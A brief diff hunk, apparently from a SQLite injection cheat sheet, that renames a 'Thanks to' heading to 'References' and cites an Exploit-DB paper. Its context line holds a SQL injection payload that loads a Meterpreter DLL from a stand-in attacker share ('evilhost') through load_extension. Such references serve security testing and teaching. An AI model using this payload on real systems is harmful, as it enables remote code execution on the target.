@@ -73,6 +73,6 @@ UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');
 
 Note: By default this component is disabled
 
-## Thanks to
+## References
 
 [Injecting SQLite database based application - Manish Kishan Tanwar](https://www.exploit-db.com/docs/41397.pdf)
